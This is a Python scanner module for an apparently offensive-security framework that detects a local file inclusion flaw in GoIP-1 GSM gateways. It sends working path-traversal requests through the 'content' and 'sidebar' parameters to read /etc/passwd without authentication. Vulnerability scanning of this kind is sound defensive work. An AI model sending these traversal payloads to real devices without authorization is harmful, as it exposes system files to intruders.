#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET para."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GoIP-1 GSM - Local File Inclusion Detection',
        'description': "GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html' is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'gsm', 'goip', 'lfi', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/',
            'http://www.hybertone.com/uploadfile/download/20140304125509964.pdf',
            'http://en.dbltek.com/latestfirmwares.html',
        ],
    }

    def run(self):
        for path in ('/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', '/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="GoIP-1 GSM - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

